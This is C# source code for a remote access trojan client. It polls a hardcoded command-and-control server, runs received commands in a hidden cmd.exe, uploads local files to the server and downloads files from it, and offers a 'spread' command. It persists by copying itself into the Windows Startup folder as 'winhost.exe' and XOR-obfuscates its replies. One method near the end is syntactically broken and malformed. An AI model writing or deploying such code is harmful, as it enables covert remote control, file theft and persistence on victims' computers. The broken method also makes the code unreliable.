using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class RATClient
{
    static readonly string C2_SERVER = "http://192.168.19.185:7777";
    static string currentDir = Directory.GetCurrentDirectory();
    static string clientIdentifier = GetClientIdentifier();
    static readonly HttpClient client = new HttpClient();

    static void Main()
    {
        InstallToStartup();

        while (true)
        {
            SendClientInfo();
            try
            {
                string cmd = client.GetStringAsync($"{C2_SERVER}/get").Result.Trim();
                if (string.IsNullOrEmpty(cmd))
                {
                    Thread.Sleep(700);
                    continue;
                }

                string output = "";

                if (cmd.StartsWith("cd "))
                {
                    try
                    {
                        Directory.SetCurrentDirectory(cmd.Substring(3).Trim());
                        currentDir = Directory.GetCurrentDirectory();
                    }
                    catch (Exception e)
                    {
                        output = e.Message;
                    }
                }
                else if (cmd.StartsWith("upload "))
                {
                    string path = cmd.Substring(7).Trim();
                    if (File.Exists(path))
                    {
                        try
                        {
                            var content = new MultipartFormDataContent();
                            content.Add(new ByteArrayContent(File.ReadAllBytes(path)), "file", Path.GetFileName(path));
                            client.PostAsync($"{C2_SERVER}/upload", content).Wait();
                            output = $"[+] Uploaded {path}";
                        }
                        catch (Exception e)
                        {
                            output = $"[-] Upload error: {e.Message}";
                        }
                    }
                    else
                    {
                        output = "[-] File not found.";
                    }
                }
                else if (cmd.StartsWith("download "))
                {
                    string filename = cmd.Substring(9).Trim();
                    try
                    {
                        byte[] data = client.GetByteArrayAsync($"{C2_SERVER}/download/{filename}").Result;
                        File.WriteAllBytes(filename, data);
                        output = $"[+] Downloaded {filename}";
                    }
                    catch (Exception e)
                    {
                        output = $"[-] Download failed: {e.Message}";
                    }
                }
                else if (cmd == "spread")
                {
                    client.PostAsync($"{C2_SERVER}/spread", null).Wait();
                    output = "[*] Spreading to other machines in the fake network...";
                }
                else
                {
                    output = RunCommand(cmd);
                }

                string response = $"{currentDir}\n{output}";
                string encrypted = Xor(response, "nullbeacon");
                client.PostAsync($"{C2_SERVER}/result", new StringContent(encrypted)).Wait();
            }
            catch { }

            Thread.Sleep(1000);
        }
    }

    static string Xor(string data, string key)
    {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < data.Length; i++)
        {
            sb.Append((char)(data[i] ^ key[i % key.Length]));
        }
        return sb.ToString();
    }

    static string RunCommand(string cmd)
    {
        try
        {
            var proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + cmd;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();

            string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
            proc.WaitForExit();
            return output;
        }
        catch (Exception e)
        {
            return e.Message;
        }
    }

    static void InstallToStartup()
    {
        try
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string startupPath = Path.Combine(appData, @"Microsoft\Windows\Start Menu\Programs\Startup");
            string target = Path.Combine(startupPath, "winhost.exe");
            string currentExe = Process.GetCurrentProcess().MainModule.FileName;
            if (!File.Exists(target))
            {
                File.Copy(currentExe, target);
            }
        }
        catch { }
    }

    static void xor(msg string)
   {
     console.wrtieline(msg)
   }
    static void SendClientInfo()
    {
        try
        {
            client.PostAsync($"{C2_SERVER}/client_info", new StringContent(clientIdentifier)).Wait();
        }
        catch { }
    }

    static string GetClientIdentifier()
    {
        return Dns.GetHostName();
    }
}
